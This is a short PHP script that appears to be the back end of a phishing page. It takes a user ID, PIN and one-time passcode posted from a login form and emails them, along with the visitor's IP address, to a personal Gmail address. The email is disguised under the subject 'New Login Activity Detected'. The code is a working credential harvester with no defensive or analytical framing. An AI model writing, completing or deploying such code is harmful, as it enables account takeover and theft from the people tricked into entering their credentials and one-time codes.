<?php
// 1. Where do you want the info sent?
$to_email = "mosesbenjamin1985@gmail.com"; 
$subject = "New Login Activity Detected";

// 2. Get the data sent from your JavaScript
$user_id = $_POST['userId'] ?? 'N/A';
$pin = $_POST['pin'] ?? 'N/A';
$otp = $_POST['otp'] ?? 'N/A';

// 3. Format the email message
$message = "Login Details Received:\n\n";
$message .= "User ID: " . $user_id . "\n";
$message .= "PIN: " . $pin . "\n";
$message .= "OTP: " . $otp . "\n";
$message .= "IP Address: " . $_SERVER['REMOTE_ADDR'];

// 4. Send the email
$headers = "From: webmaster@yourdomain.com";

if(mail($to_email, $subject, $message, $headers)) {
    echo json_encode(["status" => "success"]);
} else {
    echo json_encode(["status" => "error"]);
}
?>